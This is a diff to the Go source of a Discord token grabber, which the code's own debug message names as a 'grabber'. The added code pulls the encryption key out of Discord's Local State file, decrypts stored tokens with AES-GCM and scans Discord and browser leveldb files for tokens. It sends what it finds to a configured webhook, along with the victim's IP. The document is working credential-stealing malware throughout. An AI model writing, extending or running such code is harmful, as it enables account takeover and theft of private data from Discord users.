@@ -2,6 +2,9 @@ package main
 
 import (
 	"bytes"
+	"crypto/aes"
+	"crypto/cipher"
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -17,51 +20,21 @@ import (
 
 const (
 	WebhookUrl       = "YOUR_WEBHOOK_URL"
-	WebhookAvatarUrl = "YOUR_WEBHOOK_IMG (ex: https://imgur.com/a/xxxxx)"
+	WebhookAvatarUrl = "YOUR_WEBHOOK_IMG"
 	WebhookUsername  = "YOUR_WEBHOOK_NAME"
 	DiscordApiUsers  = "https://discord.com/api/v9/users/@me"
 	DiscordApiNitro  = "https://discord.com/api/v9/users/@me/billing/subscriptions"
 	DiscordImgUrl    = "https://cdn.discordapp.com/avatars/"
-	IpAddrGet        = "http://ipinfo.io/ip"
+	IpAddrGet        = "https://ipinfo.io/ip"
 	Debug            = false
 )
 
-var tokenRe = regexp.MustCompile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84}")
-
-func getPathWindows() (paths map[string]string) {
-	local := os.Getenv("LOCALAPPDATA")
-	roaming := os.Getenv("APPDATA")
-
-	paths = map[string]string{
-		"Lightcord":      roaming + "/Lightcord",
-		"Discord":        roaming + "/Discord",
-		"Discord Canary": roaming + "/discordcanary",
-		"Discord PTB":    roaming + "/discordptb",
-		"Google Chrome":  local + "/Google/Chrome/User Data/Default",
-		"Opera":          roaming + "/Opera Software/Opera Stable",
-		"Brave":          local + "/BraveSoftware/Brave-Browser/User Data/Default",
-		"Yandex":         local + "/Yandex/YandexBrowser/User Data/Default",
-	}
-
-	return
+type JsonKeyFile struct {
+	Crypt OSCrypt `json:"os_crypt"`
 }
 
-func getPathLinuxAndMac() (paths map[string]string) {
-	homedir, _ := os.UserHomeDir()
-
-	paths = map[string]string{
-		"Discord":        homedir + "/.config/discord",
-		"Discord Canary": homedir + "/.config/discordcanary",
-		"Discord PTB":    homedir + "/.config/discordptb",
-		"Google Chrome":  homedir + "/.config/google-chrome/Default",
-		"Opera":          homedir + "/.config/opera",
-		"Brave":          homedir + "/.config/BraveSoftware",
-		"Yandex Beta":    homedir + "/.config/yandex-browser-beta/Default",
-		"Yandex":         homedir + "/.config/yandex-browser/Default",
-		"Discord Mac":    homedir + "/Library/Application Support/discord/Local Storage/leveldb",
-	}
-
-	return
+type OSCrypt struct {
+	EncryptedKey string `json:"encrypted_key"`
 }
 
 func doesItemExists(arr []string, item string) bool {
@@ -142,36 +115,101 @@ func isTokenValid(token string, tokenList []string) bool {
 	return true
 }
 
-func findTokens(path string) (tokenList []string) {
+func getMasterKey() ([]byte, error) {
+
+	jsonFile := os.Getenv("APPDATA") + "/discord/Local State"
+
+	byteValue, err := ioutil.ReadFile(jsonFile)
+	if err != nil {
+		return nil, fmt.Errorf("could not read json file")
+	}
+
+	var fileData JsonKeyFile
+	err = json.Unmarshal(byteValue, &fileData)
+	if err != nil {
+		return nil, fmt.Errorf("could not parse json")
+	}
+
+	baseEncryptedKey := fileData.Crypt.EncryptedKey
+	encryptedKey, e := base64.StdEncoding.DecodeString(baseEncryptedKey)
+	if e != nil {
+		return nil, fmt.Errorf("could not decode base64")
+	}
+	encryptedKey = encryptedKey[5:]
+
+	key, err := Decrypt(encryptedKey)
+	if err != nil {
+		return nil, fmt.Errorf("cryptunprotectdata decryption Failed ")
+	}
+
+	return key, nil
+}
+
+func decryptToken(buffer []byte) (string, error) {
 
 	if Debug {
-		fmt.Printf("Searching for tokens !\n")
+		fmt.Println("Decrypting Token")
 	}
 
-	path += "/Local Storage/leveldb/"
-	files, _ := ioutil.ReadDir(path)
+	iv := buffer[3:15]
+	payload := buffer[15:]
 
-	for _, file := range files {
-		name := file.Name()
-		if strings.HasSuffix(name, ".log") || strings.HasSuffix(name, ".ldb") {
+	key, err := getMasterKey()
+	if err != nil {
+		return "", err
+	}
 
-			content, _ := ioutil.ReadFile(path + "/" + name)
-			lines := bytes.Split(content, []byte("\\n"))
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return "", err
+	}
 
-			for _, line := range lines {
-				for _, match := range tokenRe.FindAll(line, -1) {
+	aesGCM, err := cipher.NewGCM(block)
+	if err != nil {
+		return "", err
+	}
 
-					token := string(match)
+	ivSize := len(iv)
+	if len(payload) < ivSize {
+		return "", fmt.Errorf("incorrect iv, iv is too big")
+	}
 
-					if isTokenValid(token, tokenList) {
-						tokenList = append(tokenList, token)
-					}
-				}
-			}
+	plaintext, err := aesGCM.Open(nil, iv, payload, nil)
+	if err != nil {
+		return "", err
+	}
+
+	return string(plaintext), nil
+}
+
+func searchEncryptedToken(line []byte, tokenList *[]string) {
+
+	var tokenRegex = regexp.MustCompile("dQw4w9WgXcQ:[^\"]*")
+
+	for _, match := range tokenRegex.FindAll(line, -1) {
+
+		baseToken := strings.SplitAfterN(string(match), "dQw4w9WgXcQ:", 2)[1]
+		encryptedToken, _ := base64.StdEncoding.DecodeString(baseToken)
+		token, _ := decryptToken(encryptedToken)
+
+		if isTokenValid(token, *tokenList) {
+			*tokenList = append(*tokenList, token)
 		}
 	}
+}
 
-	return
+func searchDecryptedToken(line []byte, tokenList *[]string) {
+
+	var tokenRegex = regexp.MustCompile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84}")
+
+	for _, match := range tokenRegex.FindAll(line, -1) {
+
+		token := string(match)
+
+		if isTokenValid(token, *tokenList) {
+			*tokenList = append(*tokenList, token)
+		}
+	}
 }
 
 func getJsonValue(key string, jsonData string) (value string) {
@@ -272,18 +310,58 @@ func sendEmbed(token string) {
 	defer response.Body.Close()
 }
 
-func getAllTokens(paths map[string]string) {
+func getAllTokens() {
 
-	for _, path := range paths {
+	var paths map[string]string
+	var tokenList []string
+
+	local := os.Getenv("LOCALAPPDATA")
+	roaming := os.Getenv("APPDATA")
+
+	paths = map[string]string{
+		"Lightcord":      roaming + "/Lightcord",
+		"Discord":        roaming + "/Discord",
+		"Discord Canary": roaming + "/discordcanary",
+		"Discord PTB":    roaming + "/discordptb",
+		"Google Chrome":  local + "/Google/Chrome/User Data/Default",
+		"Opera":          roaming + "/Opera Software/Opera Stable",
+		"Opera GX":       roaming + "/Opera Software/Opera GX Stable",
+		"Brave":          local + "/BraveSoftware/Brave-Browser/User Data/Default",
+		"Yandex":         local + "/Yandex/YandexBrowser/User Data/Default",
+	}
+
+	for pathName, path := range paths {
 
 		if _, err := os.Stat(path); os.IsNotExist(err) {
 			continue
 		}
 
-		tokenList := findTokens(path)
-		for _, token := range tokenList {
-			sendEmbed(token)
+		path += "/Local Storage/leveldb/"
+		files, _ := ioutil.ReadDir(path)
+
+		for _, file := range files {
+			name := file.Name()
+
+			if !strings.HasSuffix(name, ".log") && !strings.HasSuffix(name, ".ldb") {
+				continue
+			}
+
+			content, _ := ioutil.ReadFile(path + "/" + name)
+			lines := bytes.Split(content, []byte("\\n"))
+
+			for _, line := range lines {
+
+				if pathName == "Discord" {
+					searchEncryptedToken(line, &tokenList)
+				} else {
+					searchDecryptedToken(line, &tokenList)
+				}
+			}
 		}
+	}
+
+	for _, token := range tokenList {
+		sendEmbed(token)
 	}
 }
 
@@ -293,18 +371,5 @@ func main() {
 		fmt.Println("Running grabber in Debug Mode ...")
 	}
 
-	goos := runtime.GOOS
-
-	switch goos {
-	case "windows":
-		getAllTokens(getPathWindows())
-	case "linux":
-		getAllTokens(getPathLinuxAndMac())
-	case "darwin":
-		getAllTokens(getPathLinuxAndMac())
-	default:
-		if Debug {
-			fmt.Printf("%s.\n", goos)
-		}
-	}
+	getAllTokens()
 }
